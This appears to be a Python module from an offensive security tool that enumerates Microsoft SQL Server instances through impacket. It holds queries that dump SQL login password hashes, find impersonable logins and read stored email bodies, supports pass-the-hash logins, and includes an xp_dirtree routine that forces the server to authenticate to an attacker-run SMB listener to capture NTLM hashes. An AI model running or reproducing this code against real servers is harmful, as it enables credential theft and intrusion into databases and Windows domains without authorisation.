import socket
import threading

import mssql_python
from impacket import smbserver
from impacket.tds import MSSQL

from collectors.base import BaseCollector

RED = '\033[91m'
RESET = '\033[0m'


class ImpacketMSSQLCursor:
    """Small DB-API adapter that propagates TDS errors without printing them."""
    def __init__(self, connection):
        self.connection = connection
        self.rows = []
        self.description = None

    def execute(self, query):
        self.rows = []
        self.description = None
        self.connection.lastError = False
        rows = self.connection.batch(query, tuplemode=True) or []
        errors = []
        self.connection.printReplies(error_logger=errors.append, info_logger=lambda message: None)
        if errors:
            raise errors[0]
        self.rows = rows
        self.description = [(column['Name'],) for column in self.connection.colMeta] or None

    def fetchone(self):
        return self.rows.pop(0) if self.rows else None

    def fetchall(self):
        rows, self.rows = self.rows, []
        return rows

    def close(self):
        self.rows = []


class MSSQLCollector(BaseCollector):
    type = 'mssql'
    default_database = 'master'
    identity_query = 'SELECT ORIGINAL_LOGIN(), SUSER_SNAME()'
    version_query = 'SELECT @@VERSION'
    hash_query = 'SELECT name, password_hash FROM sys.sql_logins'
    user_query = 'SELECT name, is_disabled FROM sys.server_principals'
    db_name_query = 'SELECT name FROM sys.databases WHERE database_id > 4'
    table_query = 'SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES'
    column_query = '''SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, DATA_TYPE
        FROM INFORMATION_SCHEMA.COLUMNS ORDER BY ORDINAL_POSITION'''
    cmd_exec_query = "SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
    sys_query = "SELECT IS_SRVROLEMEMBER('sysadmin')"
    db_privs_query = "SELECT IS_ROLEMEMBER('db_owner')"
    conn_query = 'EXEC sp_who2'
    link_query = '''SELECT name, product, provider, data_source, is_remote_login_enabled, modify_date
        FROM sys.servers WHERE is_linked = 1'''
    impersonation_query = """SELECT name FROM sys.server_principals
        WHERE type IN ('S', 'U', 'G') AND name <> SUSER_SNAME()
        AND HAS_PERMS_BY_NAME(name, 'LOGIN', 'IMPERSONATE') = 1"""
    email_query = 'SELECT TOP 10 recipients, subject, body FROM msdb.dbo.sysmail_allitems'

    def __init__(self, target, port, user, password, skip_data=False, columns=False,
                 keywords='', domain='', ntlm_hash='', options=None):
        super().__init__(target, port, user, password, skip_data, columns, keywords, options)
        self.domain = domain
        self.hashes = self.normalizeHashes(ntlm_hash)
        if domain:
            self.original_login = f'{domain}\\{user}'

    @staticmethod
    def normalizeHashes(ntlm_hash):
        if not ntlm_hash:
            return None
        return ntlm_hash if ':' in ntlm_hash else f'aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}'

    def _connect(self, database):
        # Re-establish impersonation before opening a database that only the
        # effective login can access.
        database = self.default_database if self.impersonate else database
        if self.domain:
            connection = MSSQL(self.target, port=self.port)
            self.connection = connection
            # Impacket's connect() has no timeout argument. Its transport uses
            # this socket for both pre-login/authentication and subsequent TDS.
            connection.socket = socket.create_connection(
                (self.target, self.port), timeout=self.options.connect_timeout)
            if not connection.login(database, self.user, self.password or '', self.domain,
                                    hashes=self.hashes, useWindowsAuth=True):
                raise ConnectionError(f'Windows authentication failed for {self.domain}\\{self.user}')
            connection.socket.settimeout(self.options.query_timeout)
            self.cursor = ImpacketMSSQLCursor(connection)
        else:
            def value(text):
                return '{' + str(text).replace('}', '}}') + '}'

            connection_string = (
                f'SERVER={value(f"{self.target},{self.port}")};DATABASE={value(database)};'
                f'UID={value(self.user)};PWD={value(self.password)};'
                'Encrypt=yes;TrustServerCertificate=yes;'
            )
            self.connection = mssql_python.connect(
                connection_string, timeout=self.options.query_timeout, autocommit=True,
                attrs_before={mssql_python.SQL_ATTR_LOGIN_TIMEOUT: self.options.connect_timeout})
            self.connection.timeout = self.options.query_timeout
            self.cursor = self.connection.cursor()

    def coerceXpDirtree(self, local_ip):
        server = smbserver.SimpleSMBServer(listenAddress=local_ip, listenPort=445)
        server.setSMBChallenge('1122334455667788')
        server.addShare('SHARE', '/tmp', 'Coerce Share')

        print(f'SMB listener active on {local_ip}:445. Awaiting connection...')

        try:
            server.start()
        except Exception as e:
            print(f'{RED} SMB Server Error: {e}{RESET}')

    # TODO: Test these in a live environment. Testing against docker doesnt seem to work right
    def startSMBServer(self, local_ip):
        smb_thread = threading.Thread(target=self.coerceXpDirtree, args=(local_ip,), daemon=True)
        smb_thread.start()

        unc_path = f"\\\\{local_ip}\\coerce_share\\test.txt"
        xp_dirtree_query = f'EXEC master..xp_dirtree \'{unc_path}\', 1, 1'
        try:
            self.cursor.execute(xp_dirtree_query)
            rows = self.cursor.fetchall()
            print(rows)
        except Exception as e:
            print(f'{RED}SQL Error: {e}{RESET}')
